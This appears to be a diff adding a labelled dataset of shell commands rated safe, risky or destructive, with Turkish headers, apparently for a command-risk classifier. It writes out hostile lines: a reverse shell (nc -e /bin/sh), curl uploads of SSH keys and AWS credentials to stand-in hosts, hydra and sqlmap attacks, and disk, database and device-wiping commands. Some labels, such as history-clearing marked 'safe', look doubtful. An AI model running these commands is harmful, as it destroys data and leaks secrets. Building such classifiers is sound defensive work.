+sudo userdel -r bob  |||  destructive
+sudo deluser --remove-home bob  |||  destructive
+sudo crontab -r  |||  destructive
+sudo rm /etc/crontab  |||  risky
+sudo sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config  |||  risky
+sudo sed -i 's/^/#/' /etc/fstab  |||  risky
+sudo tee /etc/hosts < /dev/null  |||  destructive
+sudo cp /dev/null /etc/hosts  |||  destructive
+sudo mv /etc/fstab /etc/fstab.bak  |||  risky
+sudo umount -f /mnt/data  |||  risky
+sudo mount -o remount,ro /  |||  risky
+sudo swapoff -a  |||  risky
+sudo grub-install /dev/sda  |||  risky
+sudo update-grub  |||  risky
+sudo lvremove -f /dev/vg0/data  |||  destructive
+sudo vgremove -f vg0  |||  destructive
+sudo zpool destroy tank  |||  destructive
+sudo zfs destroy -r tank/data  |||  destructive
+sudo mdadm --stop /dev/md0  |||  risky
+sudo mdadm --zero-superblock /dev/sdb1  |||  destructive
+sudo cryptsetup luksFormat /dev/sdb1  |||  destructive
+sudo cryptsetup erase /dev/sdb1  |||  destructive
+history -c  |||  safe
+unset HISTFILE  |||  safe
+export HISTSIZE=0  |||  safe
+unset PATH  |||  safe
+export PATH=  |||  safe
+kill -9 -1  |||  destructive
+sudo kill -9 1  |||  destructive
+sudo pkill -9 -u root  |||  destructive
+killall5 -9  |||  destructive
+sudo killall -9 systemd  |||  destructive
+nc -e /bin/sh 10.0.0.1 4444  |||  risky
+nmap -sS 192.168.1.0/24  |||  risky
+nmap -p- target.example.com  |||  risky
+hydra -l admin -P rockyou.txt ssh://10.0.0.5  |||  risky
+sqlmap -u "http://target/?id=1" --dump  |||  risky
+tcpdump -i any -w capture.pcap  |||  risky
+ssh-keygen -f ~/.ssh/id_ed25519 -N ""  |||  risky
+cat ~/.ssh/id_rsa  |||  risky
+cat ~/.aws/credentials  |||  risky
+cat .env  |||  safe
+scp ~/.ssh/id_rsa user@host:/tmp/  |||  risky
+curl -d @~/.aws/credentials https://paste.example.com  |||  risky
+curl --upload-file ~/.ssh/id_rsa https://transfer.example.com  |||  risky
+tar -czf - ~/.ssh | curl -X POST --data-binary @- https://x.example.com  |||  risky
+base64 ~/.ssh/id_rsa | curl -d @- https://x.example.com  |||  risky
+zip -r ~/storage/shared/backup.zip ~/projects  |||  safe
+rm -rf ~/storage/downloads  |||  destructive
+su -c "rm -rf /data"  |||  destructive
+su -c "dd if=/dev/zero of=/dev/block/sda"  |||  destructive
+su -c "rm -rf /data/media/0"  |||  destructive
+su -c "pm uninstall -k --user 0 com.google.android.gms"  |||  risky
+su -c "setenforce 0"  |||  risky
+su -c "mount -o remount,rw /system"  |||  risky
+su -c "rm -rf /system/app"  |||  destructive
+su -c "rm /data/system/locksettings.db"  |||  destructive
+su -c "reboot recovery"  |||  risky
+su -c "reboot"  |||  risky
+fastboot oem unlock  |||  destructive
+fastboot erase system  |||  destructive
+fastboot erase all  |||  destructive
+fastboot -w  |||  destructive
+fastboot format userdata  |||  destructive
+adb shell rm -rf /data/data/*  |||  destructive
+adb shell rm -rf /sdcard/DCIM  |||  destructive
+adb shell "rm -rf /storage/emulated/0/*"  |||  destructive
+adb shell pm uninstall --user 0 com.android.phone  |||  risky
+adb shell settings put global airplane_mode_on 1  |||  risky
+adb shell am force-stop com.example.app  |||  safe
+adb shell input keyevent 26  |||  safe
+adb shell screencap /sdcard/s.png  |||  safe
+adb shell dumpsys battery  |||  safe
+
 # === TEHLİKELİ GÖRÜNÜP MASUM OLANLAR ===
+
+rm -rf node_modules  |||  safe
+rm -rf node_modules package-lock.json  |||  safe
+rm -rf node_modules && npm install  |||  safe
+rm -rf ./node_modules  |||  safe
+rm -rf dist  |||  safe
+rm -rf dist build  |||  safe
+rm -rf build  |||  safe
+rm -rf out  |||  safe
+rm -rf .next  |||  safe
+rm -rf .nuxt  |||  safe
+rm -rf .svelte-kit  |||  safe
+rm -rf .turbo  |||  safe
+rm -rf .parcel-cache  |||  safe
+rm -rf .angular  |||  safe
+rm -rf .cache  |||  safe
+rm -rf coverage  |||  safe
+rm -rf .nyc_output  |||  safe
+rm -rf __pycache__  |||  safe
+rm -rf .pytest_cache  |||  safe
+rm -rf .mypy_cache  |||  safe
+rm -rf .ruff_cache  |||  safe
+rm -rf .tox  |||  safe
+rm -rf .venv  |||  safe
+rm -rf venv  |||  safe
+rm -rf .venv && python -m venv .venv  |||  safe
+rm -rf *.egg-info  |||  safe
+rm -rf target  |||  safe
+rm -rf target/debug  |||  safe
+rm -rf vendor  |||  safe
+rm -rf .gradle  |||  safe
+rm -rf .idea  |||  safe
+rm -rf Pods  |||  safe
+rm -rf build/  |||  safe
+rm -rf ./build/*  |||  safe
+rm -rf ./dist/*  |||  safe
+rm -rf tmp/*  |||  safe
+rm -rf ./tmp  |||  safe
+rm -rf /tmp/build-123  |||  safe
+rm -rf /tmp/test_output  |||  safe
+rm -rf /tmp/*.log  |||  safe
+rm -rf /tmp/pip-*  |||  safe
+rm -rf ~/.cache/pip  |||  safe
+rm -rf ~/.cache/thumbnails  |||  safe
+rm -rf ~/.npm/_cacache  |||  safe
+rm -rf ~/.gradle/caches  |||  safe
+rm -rf ~/.cargo/registry/cache  |||  safe
+rm -rf ~/Library/Developer/Xcode/DerivedData  |||  safe
+rm -rf ~/Library/Caches/Homebrew  |||  safe
+rm -rf $PREFIX/tmp/*  |||  safe
+rm -f *.pyc  |||  safe
+rm -f *.o  |||  safe
+rm -f *.log  |||  safe
+rm -f nohup.out  |||  safe
+rm -f .DS_Store  |||  safe
+rm -f npm-debug.log  |||  safe
+rm -f yarn-error.log  |||  safe
+rm -f a.out  |||  safe
+rm -f core  |||  safe
+rm *.tmp  |||  safe
+rm -rf *.pyc  |||  safe
+find . -name "node_modules" -type d -prune -exec rm -rf {} +  |||  safe
+find . -name "__pycache__" -type d -exec rm -rf {} +  |||  safe
+find . -name "*.pyc" -delete  |||  safe
+find . -name ".DS_Store" -delete  |||  safe
+find . -name "*.log" -delete  |||  safe
+find . -name "*.tmp" -delete  |||  safe
+find . -name "*.orig" -delete  |||  safe
+find /tmp -mtime +7 -delete  |||  safe
+find . -type d -empty -delete  |||  safe
+find . -name "target" -type d -prune -exec rm -rf {} +  |||  safe
+docker system prune  |||  safe
+docker system prune -f  |||  safe
+docker system prune -a  |||  safe
+docker system prune -af  |||  safe
+docker image prune  |||  safe
+docker image prune -a  |||  safe
+docker image prune -f  |||  safe
+docker container prune  |||  safe
+docker container prune -f  |||  safe
+docker builder prune  |||  safe
+docker builder prune -af  |||  safe
+docker rmi $(docker images -f dangling=true -q)  |||  safe
+docker rm $(docker ps -aq -f status=exited)  |||  safe
+docker rm web  |||  safe
+docker rmi myapp:old  |||  safe
+docker compose rm -f  |||  safe
+docker compose down --remove-orphans  |||  safe
+docker compose down --rmi local  |||  safe
+truncate -s 0 app.log  |||  safe
+truncate -s 0 logs/app.log  |||  safe
+truncate -s 0 /var/log/nginx/access.log  |||  safe
+sudo truncate -s 0 /var/log/syslog  |||  safe
+> app.log  |||  safe
+> logs/dev.log  |||  safe
+: > nohup.out  |||  safe
+: > server.log  |||  safe
+cat /dev/null > nohup.out  |||  safe
+cat /dev/null > debug.log  |||  safe
+echo "" > error.log  |||  safe
+git clean -n  |||  safe
+git clean -nfd  |||  safe
+git clean -nfdx  |||  safe
+git clean -fdX  |||  risky
+git gc  |||  safe
+git gc --auto  |||  safe
+git prune  |||  safe
+git remote prune origin  |||  safe
+git fetch --prune  |||  safe
+git branch -d feature/done  |||  safe
+git branch --merged | grep -v main | xargs git branch -d  |||  safe
+git stash -u  |||  safe
+git stash push -m "wip before rebase"  |||  safe
+git reset  |||  safe
+git reset HEAD  |||  safe
+git reset HEAD~1  |||  safe
+git reset --mixed HEAD~1  |||  safe
+git rm --cached .env  |||  safe
+git rm --cached -r node_modules  |||  safe
+git rm old_file.py  |||  risky
+git checkout -- file.txt  |||  risky
+git checkout HEAD -- src/app.py  |||  risky
+kill -9 $(lsof -ti:3000)  |||  safe
+lsof -ti:3000 | xargs kill -9  |||  safe
+lsof -ti:8080 | xargs kill  |||  safe
+kill $(lsof -t -i:5173)  |||  safe
+fuser -k 3000/tcp  |||  safe
+pkill -f "next dev"  |||  safe
+pkill -f "vite"  |||  safe
+pkill -f "python bot.py"  |||  safe
+pkill node  |||  risky
+killall node  |||  risky
+kill %1  |||  safe
+kill 12345  |||  safe
+kill -9 12345  |||  safe
+kill -SIGTERM 12345  |||  safe
+npm cache clean --force  |||  safe
+yarn cache clean  |||  safe
+pnpm store prune  |||  safe
+pip cache purge  |||  safe
+pip uninstall -y mypackage  |||  safe
+cargo clean  |||  safe
+go clean -cache  |||  safe
+go clean -modcache  |||  safe
+mvn clean  |||  safe
+gradle clean  |||  safe
+./gradlew clean  |||  safe
+make clean  |||  safe
+make distclean  |||  safe
+flutter clean  |||  safe
+brew cleanup  |||  safe
+brew cleanup -s  |||  safe
+brew autoremove  |||  safe
+brew uninstall --force oldpkg  |||  safe
+apt clean  |||  safe
+sudo apt clean  |||  safe
+sudo apt autoclean  |||  safe
+sudo apt autoremove -y  |||  risky
+pkg clean  |||  safe
+pkg autoclean  |||  safe
+pkg uninstall nano  |||  safe
+sudo rm -rf /var/cache/apt/archives/*  |||  safe
+sudo rm -rf /var/lib/apt/lists/*  |||  safe
+sudo journalctl --vacuum-time=7d  |||  safe
+sudo journalctl --vacuum-size=500M  |||  safe
+sudo rm /var/log/*.gz  |||  safe
+sudo rm -rf /var/log/journal/*  |||  risky
+logrotate -f /etc/logrotate.conf  |||  safe
+sudo chmod +x /usr/local/bin/mytool  |||  safe
+sudo chmod 755 /usr/local/bin/mytool  |||  safe
+sudo chmod -R 755 ./public  |||  safe
+chmod -R u+w .  |||  safe
+chmod -R 644 *.md  |||  safe
+chmod -R +x scripts/  |||  safe
+sudo chown -R $USER node_modules  |||  safe
+sudo chown -R $USER:$USER ~/.npm  |||  safe
+sudo chown -R $USER:$USER .  |||  safe
+sudo chown $USER /var/run/docker.sock  |||  safe
+sudo usermod -aG docker $USER  |||  safe
+sudo cp nginx.conf /etc/nginx/sites-available/app  |||  risky
+sudo ln -s /etc/nginx/sites-available/app /etc/nginx/sites-enabled/  |||  risky
+sudo nginx -t  |||  safe
+sudo nginx -s reload  |||  safe
+sudo systemctl daemon-reload  |||  safe
+sudo systemctl enable docker  |||  safe
+sudo systemctl start docker  |||  safe
+sudo systemctl restart docker  |||  risky
+sudo systemctl status docker  |||  safe
+dd if=/dev/zero of=test.img bs=1M count=100  |||  safe
+dd if=/dev/urandom of=random.bin bs=1M count=10  |||  safe
+dd if=/dev/zero of=swapfile bs=1M count=1024  |||  safe
+dd if=/dev/zero of=./disk.img bs=1M count=512 status=progress  |||  safe
+dd if=disk.img of=backup.img  |||  safe
+mkfs.ext4 disk.img  |||  risky
+mkswap swapfile  |||  safe
+sudo swapon swapfile  |||  safe
+echo 'export PATH="$HOME/bin:$PATH"' >> ~/.zshrc  |||  safe
+echo "alias ll='ls -la'" >> ~/.bashrc  |||  safe
+echo "" >> ~/.bashrc  |||  safe
+echo test > /dev/null  |||  safe
+ls > /dev/null 2>&1  |||  safe
+command -v node > /dev/null  |||  safe
+cat /dev/null  |||  safe
+sed -i.bak 's/foo/bar/g' config.yml  |||  safe
+sed -i.bak 's/localhost/db/' .env  |||  safe
+sed 's/foo/bar/g' input.txt > output.txt  |||  safe
+sed -n '1,10p' file.txt  |||  safe
+awk '{print $1}' file.txt > out.txt  |||  safe
+cp -f config.json config.json.bak  |||  safe
+mv -n a.txt b.txt  |||  safe
+mv -i draft.md final.md  |||  safe
+mv build build_old  |||  safe
+mv .env .env.bak  |||  safe
+mv node_modules node_modules.old  |||  safe
+DROP TABLE IF EXISTS tmp_import;  |||  risky
+DROP TABLE IF EXISTS test_users;  |||  risky
+DELETE FROM sessions WHERE expires_at < now();  |||  risky
+DELETE FROM cache WHERE created_at < now() - interval '7 days';  |||  risky
+TRUNCATE TABLE temp_staging;  |||  risky
+psql -c "DROP DATABASE IF EXISTS test_db;"  |||  risky
+psql -c "CREATE DATABASE test_db;"  |||  safe
+createdb mydb  |||  safe
+dropdb test_db  |||  risky
+sqlite3 test.db "DELETE FROM test_data;"  |||  risky
+rm test.db  |||  risky
+rm -f test.sqlite3  |||  risky
+python manage.py flush --noinput  |||  destructive
+python manage.py migrate --run-syncdb  |||  safe
+rails db:drop RAILS_ENV=test  |||  risky
+rails db:reset  |||  destructive
+rails db:migrate  |||  safe
+rails db:seed  |||  safe
+npx prisma migrate dev  |||  safe
+npx prisma migrate reset  |||  destructive
+npx prisma migrate deploy  |||  risky
+npx prisma db push --force-reset  |||  destructive
+npx prisma studio  |||  safe
+npx knex migrate:rollback  |||  risky
+alembic upgrade head  |||  risky
+alembic downgrade -1  |||  risky
+flask db migrate  |||  safe
+redis-cli FLUSHDB  |||  risky
+redis-cli -n 1 FLUSHDB  |||  risky
+redis-cli DEL mykey  |||  safe
+redis-cli SELECT 1  |||  safe
+supervisorctl restart all  |||  risky
+pm2 restart all  |||  risky
+pm2 delete all  |||  risky
+pm2 logs  |||  safe
+pm2 flush  |||  safe
+pm2 list  |||  safe
+docker compose build --no-cache  |||  safe
+docker build --no-cache -t myapp .  |||  safe
+docker run --rm -v $(pwd):/app node:20 npm install  |||  safe
+docker run --rm -v $(pwd):/data alpine rm -rf /data/tmp  |||  risky
+docker run --rm alpine rm -rf /tmp/*  |||  safe
+kubectl delete pod my-pod --force --grace-period=0  |||  risky
+kubectl delete pod -l app=test  |||  risky
+kubectl delete job completed-job  |||  safe
+kubectl delete -f test-pod.yaml  |||  risky
+kubectl delete cm test-config  |||  risky
+kubectl config use-context minikube  |||  safe
+kubectl delete -f k8s/ --dry-run=client  |||  safe
+minikube delete  |||  risky
+minikube stop  |||  safe
+kind delete cluster  |||  risky
+terraform destroy -target=aws_instance.test  |||  risky
+terraform plan -destroy  |||  safe
+terraform workspace delete dev  |||  risky
+aws s3 rm s3://my-bucket/tmp/ --recursive  |||  risky
+aws s3 rm s3://my-test-bucket/file.txt  |||  risky
+aws s3 cp file.txt s3://my-bucket/  |||  safe
+aws s3 sync ./dist s3://my-bucket  |||  safe
+aws s3 sync ./dist s3://my-bucket --dryrun  |||  safe
+aws ec2 stop-instances --instance-ids i-0abc123  |||  risky
+aws ec2 start-instances --instance-ids i-0abc123  |||  safe
+rsync -av --delete --dry-run src/ dst/  |||  safe
+rsync -avn --delete src/ dst/  |||  safe
+rsync -av --remove-source-files src/ dst/  |||  risky
+tar --remove-files -czf logs.tar.gz *.log  |||  risky
+tar -xzf archive.tar.gz -C /tmp/extract  |||  safe
+unzip -o archive.zip  |||  risky
+unzip -d output archive.zip  |||  safe
+cp -r src/* dist/  |||  safe
+cp -rf template/. .  |||  risky
+ln -sf /usr/bin/python3 /usr/local/bin/python  |||  safe
+ln -sfn releases/v2 current  |||  safe
+unlink current  |||  safe
+rmdir empty_dir  |||  safe
+rmdir build  |||  safe
+rmdir --ignore-fail-on-non-empty tmp  |||  safe
+mkdir tmp && cd tmp  |||  safe
+yes | head -5  |||  safe
+yes | rm -i file.txt  |||  risky
+echo y | sudo apt install htop  |||  safe
+apt-get install -y curl  |||  safe
+sudo apt-get install --reinstall nginx  |||  risky
+wipe  |||  risky
+reset  |||  safe
+stty sane  |||  safe
+termux-reload-settings  |||  safe
+termux-change-repo  |||  risky
+termux-fix-shebang script.py  |||  safe
+termux-media-scan ~/storage/shared/Download/  |||  safe
+termux-notification --title hi --content done  |||  safe
+termux-toast "build finished"  |||  safe
+termux-vibrate -d 200  |||  safe
+termux-tts-speak "tamamlandı"  |||  safe
+termux-clipboard-set "hello"  |||  safe
+termux-camera-photo -c 0 photo.jpg  |||  risky
+termux-sms-send -n 5551234567 "test"  |||  risky
+termux-sms-list  |||  risky
+termux-contact-list  |||  risky
+termux-location  |||  risky
+termux-telephony-call 112  |||  risky
+termux-dialog confirm -t "Sure?"  |||  safe
+am start -a android.intent.action.VIEW -d https://example.com  |||  safe
+am start -n com.example.app/.MainActivity  |||  safe
+am force-stop com.example.app  |||  safe
+am broadcast -a android.intent.action.BOOT_COMPLETED  |||  risky
+dumpsys battery  |||  safe
+getprop ro.product.model  |||  safe
+settings get global airplane_mode_on  |||  safe
+input tap 500 500  |||  safe
+screencap -p /sdcard/s.png  |||  safe
+logcat -d | tail -50  |||  safe
+logcat -c  |||  safe
+pm list packages | grep google  |||  safe
+pm path com.example.app  |||  safe
+pm disable-user --user 0 com.example.bloatware  |||  risky
+cmd package list packages  |||  safe
+cp ~/storage/shared/Download/file.apk ~/  |||  safe
+mv ~/storage/shared/Download/*.pdf ~/storage/shared/Documents/  |||  safe
+cp -r ~/projects ~/storage/shared/backup  |||  safe
+ls ~/storage/shared/DCIM  |||  safe
+du -sh ~/storage/shared/*  |||  safe
+find ~/storage/shared -name "*.mp4" -size +500M  |||  safe
+find ~/storage/shared -name "*.tmp" -delete  |||  safe
+find ~/storage/shared/Download -mtime +30 -delete  |||  risky
+rm ~/storage/shared/Download/*.apk  |||  risky
+rm -rf ~/storage/shared/.thumbnails  |||  safe
+rm -rf ~/.cache  |||  safe
+rm -rf ~/.cache/*  |||  safe
+rm -rf ~/.local/share/Trash/*  |||  safe
+rm -rf ~/.Trash/*  |||  safe
+rm -rf ~/.npm  |||  safe
+rm -rf ~/.gradle  |||  safe
+rm -rf ~/.m2/repository  |||  safe
+rm -rf ~/.cargo/registry  |||  safe
+
+# === ETİKETSİZ (notere bırak — gri bölge / belirsiz bağlam) ===
+
+rm -rf $TARGET
+rm -rf "$1"
+rm -rf $(pwd)
+rm -rf $(pwd)/*
+rm -rf `pwd`
+rm -rf ../build
+rm -rf ../../
+rm -rf ./
+rm -rf .
+rm -rf *.log
+rm -rf data/
+rm -rf uploads/
+rm -rf logs/
+rm -rf old/
+rm -rf release/
+rm -rf backups/
+rm -rf ~/Downloads/*
+rm -rf ~/Desktop/*
+rm -rf ~/Documents/old
+rm -rf /mnt/data/tmp
+rm -rf /srv/app/releases/20240101
+rm -rf /var/www/html/*
+rm -rf /var/log/myapp
+rm -rf /opt/app/cache
+find . -name "*.csv" -delete
+find . -name "*.sql" -delete
+find . -empty -delete
+find . -mtime +90 -delete
+find . -size +1G -delete
+find /var/log -name "*.log" -mtime +30 -delete
+find /home -name "*.tmp" -delete
+git reset --hard
+git reset --hard HEAD^
+git reset --hard FETCH_HEAD
+git reset --hard @{u}
+git clean -fx
+git clean -f
+git clean -fdn
+git checkout -B main origin/main
+git checkout origin/main -- .
+git pull --force
+git fetch origin main:main --force
+git push origin HEAD --force-with-lease
+git push --force-with-lease
+git push origin +main
+git push origin +feature/x
+git rebase --onto main HEAD~5
+git commit --amend
+git revert -n HEAD~3..HEAD
+git worktree remove --force ../wt
+git submodule deinit -f --all
+git stash show -p | git apply -R
+docker compose down -v --remove-orphans
+docker volume rm $(docker volume ls -qf dangling=true)
+docker volume prune
+docker system prune --volumes
+docker system prune -a --filter "until=24h"
+docker rm -f $(docker ps -aq --filter name=test)
+docker kill $(docker ps -q)
+docker stop $(docker ps -aq)
+docker network prune -f
+docker swarm leave --force
+docker exec db pg_dump -U postgres app > dump.sql
+docker exec db psql -U postgres -c "DROP SCHEMA public CASCADE; CREATE SCHEMA public;"
+docker exec -it db redis-cli FLUSHALL
+kubectl delete pod --all
+kubectl delete pod --all -n staging
+kubectl delete deploy --all -n dev
+kubectl delete ns preview-123
+kubectl delete -f .
+kubectl rollout undo deployment/api
+kubectl set image deployment/api api=myapp:v2
+kubectl patch deployment api -p '{"spec":{"replicas":0}}'
+kubectl cordon node-1
+kubectl exec -it api-pod -- rm -rf /tmp/cache
+kubectl exec -it db-0 -- psql -U postgres -c "DELETE FROM jobs;"
+terraform apply -replace=aws_instance.web
+terraform import aws_s3_bucket.b my-bucket
+terraform taint aws_instance.web
+terraform state mv aws_instance.a aws_instance.b
+aws s3 rm s3://staging-bucket --recursive
+aws s3 mv s3://a/file s3://b/file
+aws s3 sync s3://prod s3://staging --delete
+aws dynamodb scan --table-name users
+aws ssm put-parameter --name /app/key --value x --overwrite
+aws secretsmanager delete-secret --secret-id prod/db --force-delete-without-recovery
+gcloud compute instances stop vm-1
+gcloud compute ssh vm-1
+gcloud app deploy
+gcloud run deploy api --image gcr.io/proj/api
+psql -c "VACUUM FULL;"
+psql -c "REINDEX DATABASE mydb;"
+psql -c "DROP INDEX idx_users_email;"
+psql -c "ALTER TABLE users ADD COLUMN age int;"
+psql -c "UPDATE users SET active = false WHERE last_login < now() - interval '1 year';"
+psql -c "DELETE FROM logs WHERE created_at < now() - interval '30 days';"
+psql -f migration.sql
+psql < dump.sql
+mysql < dump.sql
+sqlite3 app.db < schema.sql
+sqlite3 app.db "VACUUM;"
+sqlite3 app.db "DROP TABLE tmp;"
+mongorestore --drop dump/
+pg_restore -c -d mydb dump
+redis-cli --scan --pattern "cache:*" | xargs redis-cli del
+redis-cli CONFIG SET save ""
+redis-cli SHUTDOWN
+redis-cli FLUSHDB ASYNC
+sudo systemctl stop postgresql
+sudo systemctl restart postgresql
+sudo systemctl stop mysql
+sudo systemctl mask sleep.target
+sudo service nginx restart
+sudo nginx -s stop
+sudo apt remove nginx
+sudo apt remove --purge docker.io
+sudo apt full-upgrade -y
+sudo apt dist-upgrade
+sudo do-release-upgrade
+sudo snap remove firefox
+sudo snap refresh
+sudo pip install --upgrade pip
+sudo npm install -g npm@latest
+sudo npm uninstall -g yarn
+sudo gem uninstall rails
+sudo chmod -R 777 /tmp/shared
+sudo chmod -R 755 /var/www/html
+sudo chown -R www-data:www-data /var/www
+sudo chown -R $USER /usr/local
+sudo chown -R $(whoami) /usr/local/bin
+sudo chmod 666 /dev/ttyUSB0
+sudo mount /dev/sdb1 /mnt/usb
+sudo umount /mnt/usb
+sudo fdisk -l
+sudo parted -l
+lsblk
+blkid
+sudo ufw allow 22
+sudo ufw allow 80/tcp
+sudo ufw enable
+sudo iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
+sudo iptables -L
+sudo ip addr add 10.0.0.5/24 dev eth0
+sudo ip route add default via 10.0.0.1
+sudo ifconfig wlan0 down
+sudo hostnamectl set-hostname newname
+sudo timedatectl set-timezone Europe/Istanbul
+sudo nano /etc/hosts
+sudo vim /etc/fstab
+sudo tee -a /etc/hosts <<< "127.0.0.1 app.local"
+sudo bash -c 'echo "foo" > /etc/foo.conf'
+sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
+sudo sysctl -w vm.swappiness=10
+sudo sysctl -p
+sudo crontab -e
+sudo useradd -m deploy
+sudo usermod -s /bin/bash deploy
+sudo groupadd devs
+sudo passwd deploy
+sudo -u postgres psql
+sudo -i
+sudo su
+su -
+su -c "ls /data"
+su -c "pm list packages"
+su -c "cat /proc/cpuinfo"
+su -c "mount | grep system"
+su -c "cp /sdcard/x.conf /data/local/tmp/"
+su -c "chmod 755 /data/local/tmp/x"
+su -c "settings put global development_settings_enabled 1"
+su -c "rm /data/local/tmp/*"
+su -c "rm -rf /data/local/tmp"
+su -c "killall -9 com.example.app"
+su -c "am force-stop com.example.app"
+su -c "iptables -F"
+su -c "reboot"
+tsu
+adb shell su -c id
+adb shell rm /sdcard/test.txt
+adb shell rm -rf /sdcard/Download/*
+adb shell rm -rf /data/local/tmp/*
+adb shell pm clear com.android.chrome
+adb shell pm disable-user com.example.bloat
+adb shell pm uninstall -k --user 0 com.example.bloat
+adb shell dd if=/dev/zero of=/sdcard/fill bs=1M count=100
+adb shell am start -a android.intent.action.CALL -d tel:112
+adb shell input text hello
+adb shell settings put system screen_off_timeout 600000
+adb sideload update.zip
+adb root
+adb remount
+adb disable-verity
+adb tcpip 5555
+adb connect 192.168.1.50:5555
+adb kill-server
+fastboot devices
+fastboot reboot
+fastboot getvar all
+fastboot flash recovery twrp.img
+fastboot boot twrp.img
+fastboot oem device-info
+curl -X PUT https://api.example.com/config -d @cfg.json
+curl -X PATCH https://api.example.com/users/1 -d '{"name":"x"}'
+curl -X POST https://api.example.com/deploy
+curl -X POST https://hooks.slack.com/services/T000/B000/XXX -d '{"text":"done"}'
+curl -X DELETE https://api.example.com/cache
+curl -s https://example.com/script.sh | bash -s -- --yes
+curl -sSL https://install.python-poetry.org | python3 -
+curl -fsSL https://bun.sh/install | bash
+curl -fsSL https://deno.land/install.sh | sh
+curl -sfL https://get.k3s.io | sh -
+curl https://sh.rustup.rs -sSf | sh
+wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/master/install.sh | bash
+pip install git+https://github.com/user/repo.git
+pip install --force-reinstall -r requirements.txt
+pip install --no-cache-dir --upgrade pip
+npm install -g some-random-package
+npm install --force
+npm install --legacy-peer-deps
+npm audit fix --force
+npm link
+npm version patch
+npm run clean
+npm run reset
+npm run db:reset
+npm run migrate:down
+npm run seed
+npm run deploy
+npm run release
+yarn install --force
+yarn upgrade
+yarn global add typescript
+make install
+make uninstall
+make deploy
+make clean && make
+./configure && make && sudo make install
+sudo make install
+sudo make uninstall
+./deploy.sh
+./deploy.sh production
+./reset.sh
+./cleanup.sh
+./backup.sh
+./restore.sh backup.tar.gz
+bash install.sh
+sh run.sh
+python deploy.py
+python reset_db.py
+python manage.py loaddata fixtures.json
+python manage.py shell
+python manage.py dbshell
+python manage.py collectstatic --noinput
+python manage.py createsuperuser
+python manage.py sqlflush
+ansible-playbook site.yml
+ansible-playbook site.yml --check
+ansible all -m shell -a "rm -rf /tmp/cache"
+ansible all -m shell -a "reboot"
+ansible-vault decrypt secrets.yml
+fab deploy
+cap production deploy
